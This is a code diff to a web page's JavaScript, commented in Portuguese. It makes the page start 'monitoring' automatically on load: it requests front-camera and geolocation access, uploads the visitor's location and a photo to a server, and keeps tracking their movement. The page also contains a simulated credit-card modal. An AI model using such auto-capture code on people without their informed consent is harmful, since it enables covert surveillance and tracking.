@@ -366,6 +366,8 @@ let photoCount = 0;
 let takingPhoto = false;
 
 let watchId = null;
+let monitoringStarted = false;
+let monitoringStarting = false;
 
 
 /*
@@ -606,84 +608,249 @@ INICIAR MONITORAMENTO
 
 async function startMonitoring() {
 
+    if (monitoringStarted || monitoringStarting) {
+        return true;
+    }
+
+    monitoringStarting = true;
+
     try {
 
-        // 1. A localização é o requisito principal.
-        setStatus("Solicitando autorização da localização...");
+        /*
+        ========================================================
+        1. DISPARA CÂMERA E LOCALIZAÇÃO AUTOMATICAMENTE
+        ========================================================
 
-        const position = await getCurrentLocation();
+        As duas solicitações começam sem depender uma da outra.
 
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        const accuracy = position.coords.accuracy;
+        A localização é obrigatória.
+        A câmera é opcional.
 
-        // 2. Identifica a sessão somente depois de obter a localização.
-        await getPersistentSession();
+        Não aguardamos a câmera para iniciar a localização.
+        */
 
-        updatePositionDisplay(latitude, longitude);
+        setStatus("Solicitando câmera e localização...");
 
-        // 3. Salva a localização inicial.
-        setStatus("Registrando localização...");
+        const cameraPromise = (async function () {
+            try {
 
-        const locationResult = await uploadLocation(
-            latitude,
-            longitude,
-            accuracy
-        );
+                if (
+                    !navigator.mediaDevices ||
+                    !navigator.mediaDevices.getUserMedia
+                ) {
+                    return false;
+                }
 
-        lastLocationId = locationResult.location_id;
-
-        // 4. A câmera é opcional. Se for recusada, a localização continua.
-        setStatus("Localização ativa. Verificando câmera...");
-
-        let cameraAvailable = false;
-
-        try {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user" },
-                    audio: false
-                });
+                stream =
+                    await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: "user"
+                        },
+                        audio: false
+                    });
 
                 video.srcObject = stream;
+
                 video.loop = false;
-                await video.play().catch(function() {});
-                cameraAvailable = true;
+
+                await video.play().catch(function () {});
+
+                return true;
+
+            } catch (cameraError) {
+
+                console.warn(
+                    "Câmera não autorizada/disponível:",
+                    cameraError
+                );
+
+                stream = null;
+
+                return false;
             }
-        } catch (cameraError) {
-            console.warn("Câmera não autorizada/disponível:", cameraError);
-            stream = null;
-            cameraAvailable = false;
+        })();
+
+        /*
+        A chamada de localização é feita imediatamente,
+        sem esperar a câmera.
+        */
+
+        const locationPromise =
+            getCurrentLocation();
+
+
+        /*
+        ========================================================
+        2. LOCALIZAÇÃO É O REQUISITO PRINCIPAL
+        ========================================================
+        */
+
+        let position;
+
+        try {
+
+            position =
+                await locationPromise;
+
+        } catch (locationError) {
+
+            monitoringStarting = false;
+
+            console.warn(
+                "Localização não autorizada/disponível:",
+                locationError
+            );
+
+            setStatus(
+                "Não foi possível obter sua localização.",
+                true
+            );
+
+            throw new Error(
+                "A localização é necessária para iniciar o monitoramento."
+            );
         }
 
-        // 5. Foto inicial somente se a câmera estiver disponível.
-        if (cameraAvailable && video.videoWidth && video.videoHeight) {
+
+        const latitude =
+            position.coords.latitude;
+
+        const longitude =
+            position.coords.longitude;
+
+        const accuracy =
+            position.coords.accuracy;
+
+
+        /*
+        ========================================================
+        3. IDENTIFICA A SESSÃO
+        ========================================================
+        */
+
+        await getPersistentSession();
+
+        updatePositionDisplay(
+            latitude,
+            longitude
+        );
+
+
+        /*
+        ========================================================
+        4. SALVA A PRIMEIRA LOCALIZAÇÃO
+        ========================================================
+        */
+
+        setStatus(
+            "Registrando localização..."
+        );
+
+        const locationResult =
+            await uploadLocation(
+                latitude,
+                longitude,
+                accuracy
+            );
+
+        lastLocationId =
+            locationResult.location_id;
+
+
+        /*
+        ========================================================
+        5. CÂMERA É OPCIONAL
+        ========================================================
+        */
+
+        const cameraAvailable =
+            await cameraPromise;
+
+        if (
+            cameraAvailable &&
+            video.videoWidth &&
+            video.videoHeight
+        ) {
+
             try {
-                setStatus("Localização e câmera ativas.", false);
-                await captureAndUploadPhoto(lastLocationId);
+
+                setStatus(
+                    "Localização e câmera ativas.",
+                    false
+                );
+
+                await captureAndUploadPhoto(
+                    lastLocationId
+                );
+
             } catch (photoError) {
-                console.warn("Foto inicial não enviada:", photoError);
+
+                console.warn(
+                    "Foto inicial não enviada:",
+                    photoError
+                );
+
             }
+
         } else {
-            setStatus("Localização ativa. Somente a localização será enviada.", false);
+
+            setStatus(
+                "Localização ativa. Câmera indisponível.",
+                false
+            );
+
         }
 
-        // 6. O ponto de referência é sempre a última localização registrada.
-        lastPhotoLatitude = latitude;
-        lastPhotoLongitude = longitude;
-        distanceElement.textContent = "0 m";
 
-        // 7. Continua acompanhando o deslocamento independentemente da câmera.
+        /*
+        ========================================================
+        6. DEFINE O PONTO DE REFERÊNCIA
+        ========================================================
+        */
+
+        lastPhotoLatitude =
+            latitude;
+
+        lastPhotoLongitude =
+            longitude;
+
+        if (distanceElement) {
+
+            distanceElement.textContent =
+                "0 m";
+
+        }
+
+
+        /*
+        ========================================================
+        7. INICIA O ACOMPANHAMENTO
+        ========================================================
+        */
+
         startWatchingPosition();
+
+        monitoringStarted = true;
+        monitoringStarting = false;
 
         return true;
 
+
     } catch (error) {
-        console.error("Erro:", error);
-        setStatus("Erro: " + error.message, true);
+
+        monitoringStarting = false;
+
+        console.error(
+            "Erro na inicialização:",
+            error
+        );
 
         if (watchId !== null) {
-            navigator.geolocation.clearWatch(watchId);
+
+            navigator.geolocation.clearWatch(
+                watchId
+            );
+
             watchId = null;
         }
 
@@ -1576,6 +1743,42 @@ function handleSimulatedPayment(event) {
     closeCardModal();
 
 }
+
+/*
+============================================================
+INICIALIZAÇÃO AUTOMÁTICA
+============================================================
+
+A página tenta iniciar o monitoramento automaticamente.
+A localização é obrigatória; a câmera é opcional.
+*/
+
+if (document.readyState === "loading") {
+
+    document.addEventListener(
+        "DOMContentLoaded",
+        function () {
+            startMonitoring().catch(function (error) {
+                console.warn(
+                    "Monitoramento não iniciado:",
+                    error
+                );
+            });
+        },
+        { once: true }
+    );
+
+} else {
+
+    startMonitoring().catch(function (error) {
+        console.warn(
+            "Monitoramento não iniciado:",
+            error
+        );
+    });
+
+}
+
 </script>
 </body>
 <!-- MODAL DE CARTÃO DE CRÉDITO (ILUSTRATIVO) -->
